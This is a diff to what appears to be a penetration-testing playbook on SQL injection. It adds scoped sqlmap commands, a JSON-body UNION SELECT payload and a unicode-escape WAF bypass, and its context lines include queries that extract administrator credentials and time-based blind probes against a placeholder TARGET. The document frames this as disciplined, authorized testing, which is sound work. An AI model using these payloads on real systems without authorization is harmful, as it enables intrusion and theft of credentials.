@@ -45,6 +45,15 @@ Run a quiet control between probes; one slow response is not proof — require a
 
 Stop at proof. Extract the **one** value that demonstrates impact (e.g. `version()` plus a single admin credential) — do not dump whole tables.
 
+**sqlmap (confirm/exploit only, AFTER manual triage):** once you've identified the param, context, and DB by hand, hand sqlmap the *narrow* job — never let it discover for you.
+```bash
+sqlmap -u 'https://TARGET/product?category=Gifts' -p category \
+  --dbms=mysql --technique=U --batch --random-agent   # --technique to the one you confirmed (U/B/T/E/S)
+# JSON body / non-GET: save the full request and feed it in (mark the inj point with *)
+sqlmap -r req.txt -p category --dbms=mysql --technique=U --batch --random-agent
+```
+Escalate `--level`/`--risk` (default 1/1) only as a documented fallback when a hand-confirmed injection won't trigger at default — and say so in notes. **Never** run the `--crawl=1 --level=5 --risk=3 --forms` shotgun: it's slow, noisy, trips WAFs/lockouts, and produces unvalidated scanner findings this workspace rejects.
+
 ## Common bypasses
 - Comments to terminate the query: `--`, `#` (MySQL), `/* */`; inline `/**/` to break up keywords.
 - Filter/WAF evasion: case variation, encoding (URL/double-URL/unicode/hex), whitespace alternates (`/**/`, `%09`, `%0a`).
@@ -61,6 +70,12 @@ curl -sG 'https://TARGET/product' \
 curl -sG 'https://TARGET/product' \
   --data-urlencode "category=x' UNION SELECT username, password FROM users WHERE username='administrator'-- -"
 ```
+JSON-body API (modern SPA/mobile backend) — same injection inside the JSON string value:
+```bash
+curl -s https://TARGET/api/search -H 'Content-Type: application/json' \
+  -d '{"category":"Gifts'"'"' UNION SELECT NULL,@@version-- -"}'
+```
+Drop the same break/boolean (`' AND '1'='1` vs `'2`) and time (`pg_sleep`/`SLEEP`) probes into the JSON string value. If a WAF parses the JSON, unicode-escape the SQL metachars to slip it (`'`→`\u0027`, `"`→`\u0022`, space→`\u0020`) — the JSON parser decodes them before the value reaches the query.
 Time-based blind control vs. true:
 ```bash
 time curl -s 'https://TARGET/item?id=1%20AND%20(SELECT%201%20FROM%20pg_sleep(0))'   # control ~0s
